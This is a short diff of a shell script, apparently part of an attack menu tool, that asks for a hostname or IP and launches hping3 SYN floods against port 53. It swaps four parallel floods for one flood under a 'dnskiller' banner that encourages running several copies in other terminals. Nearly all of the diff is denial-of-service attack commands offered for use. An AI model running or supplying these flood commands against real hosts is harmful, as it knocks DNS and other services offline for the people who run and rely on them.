@@ -45,5 +45,5 @@ fi
 
 echo -e "${ENTER_LINE}Hostname/IP?${END}"
 read host
-hping3 -S -p 53 $host --flood & hping3 -S -p 53 $host --flood & hping3 -S -p 53 $host --flood & hping3 -S -p 53 $host --flood & 
-echo -e "${WARNING}EXIT USING sudo pkill -9 hping3.${END}"
+echo -e "${BLUE}Starting dnskiller. You can run several by opening the menu in more terminal windows and starting it from there.${END}"
+hping3 -S -p 53 $host --flood 
